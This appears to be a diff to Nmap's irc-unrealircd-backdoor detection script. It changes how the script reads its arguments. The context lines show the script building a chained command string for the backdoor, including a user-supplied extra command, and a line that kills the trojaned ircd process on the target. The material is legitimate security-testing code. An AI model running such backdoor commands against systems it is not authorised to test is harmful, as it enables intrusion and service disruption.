@@ -90,8 +90,8 @@ action = function(host, port)
 
 	-- Set up an extra command, if the user requested one
 	local command_extra = ""
-	if(nmap.registry.args['irc-unrealircd-backdoor.command']) then
-		command_extra = nmap.registry.args['irc-unrealircd-backdoor.command']
+	if(stdnse.get_script_args('irc-unrealircd-backdoor.command')) then
+		command_extra = stdnse.get_script_args('irc-unrealircd-backdoor.command')
 		-- Replace "%IP%" with the ip address
 		command_extra = string.gsub(command_extra, '%%IP%%', host.ip)
 	end
@@ -109,8 +109,8 @@ action = function(host, port)
 	local full_command = string.format("%s;%s;%s;%s;%s", trigger, unique, command_linux, command_windows, command_extra)
 
 	-- wait time: get rid of fast reconnecting annoyance
-	if(nmap.registry.args['irc-unrealircd-backdoor.wait']) then
-		local waittime = nmap.registry.args['irc-unrealircd-backdoor.wait']
+	if(stdnse.get_script_args('irc-unrealircd-backdoor.wait')) then
+		local waittime = stdnse.get_script_args('irc-unrealircd-backdoor.wait')
 		stdnse.print_debug(1, "irc-unrealircd-backdoor: waiting for %i seconds", waittime)
 		stdnse.sleep(waittime)
 	end
@@ -182,7 +182,7 @@ action = function(host, port)
 	-- Determine whether or not the vulnerability is present
 	if(elapsed > (delay - delay_fudge)) then
 		-- Check if the user wants to kill the server.
-		if(nmap.registry.args['irc-unrealircd-backdoor.kill']) then
+		if(stdnse.get_script_args('irc-unrealircd-backdoor.kill')) then
 			stdnse.print_debug(1, "irc-unrealircd-backdoor: Attempting to kill the Trojanned UnrealIRCd server...")
 
 			local linux_kill = "kill `ps -e | grep ircd | awk '{ print $1 }'`"
